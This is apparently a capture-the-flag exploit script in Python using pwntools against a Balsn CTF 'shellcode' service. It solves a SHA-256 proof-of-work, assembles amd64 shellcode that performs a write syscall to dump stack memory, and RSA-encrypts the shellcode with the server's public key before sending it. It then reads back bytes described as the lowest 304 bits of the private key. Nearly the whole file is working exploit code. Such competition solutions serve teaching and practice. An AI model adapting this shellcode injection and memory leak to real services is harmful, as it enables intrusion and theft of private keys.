#!/usr/bin/python
from pwn import *
from Crypto.PublicKey import RSA
from hashlib import sha256

import sys
import string
import multiprocessing as mp
import itertools as it

host = 'shellcode.balsnctf.com'
port = 4001

head = ''

def check(inp):
    now = head + ''.join(inp)
    now = sha256(now).hexdigest()[:2]
    if now == '00':
        return ''.join(inp)


def PoW():
    global head
    r.recvuntil('sha256(')
    head = r.recvuntil(' ')[:-1]
    r.recvuntil('answer =')
    p = mp.Pool(3)
    poss = string.digits + string.ascii_letters
    iterator = it.product(poss, repeat=2)
    print ('start')
    ret = p.map(check, iterator)
    print ('end')
    for i in ret:
        if i is None:
            continue
        r.sendline(i)
        break


RSA_LENGTH = 1024

context.arch = 'amd64'
payload='''
add rsp, 0x18;
pop rsi;
sub rsi, 0x4e;
xor edi, edi;
inc edi;
xor edx, edx;
add edx, 0x36;
xor eax, eax;
inc eax;
syscall;
'''


key = RSA.importKey(open('pub.pem'))
adjust = asm('push rax;\npop rax')
payload = asm(payload)
length = len(payload)
print (length)
add_adjust = (((RSA_LENGTH // 8) - length) // 2) * adjust
# payload = add_adjust + payload
payload = payload.ljust(128, '\x00')
assert len(payload) == RSA_LENGTH // 8

payload = int(payload.encode('hex'), 16)
payload = pow(payload, key.e, key.n)

payload = hex(payload)[2:].strip('L')
if len(payload) % 2 != 0:
    payload = '0' + payload
payload = payload.decode('hex')

r = remote(host, port)
PoW()
sys.stdout.write(r.recvuntil(':'))
r.sendline(payload)
sys.stdout.write(r.recvuntil('stuff...\n'))
r.recvn(0x10)
ret = ''.join(reversed(r.recvn(38)))
print (ret.encode('hex'))
print (hex(key.d)[2:].strip('L'))
least_304_bits_private_key = int(ret.encode('hex'), 16)
print (least_304_bits_private_key)
r.interactive()

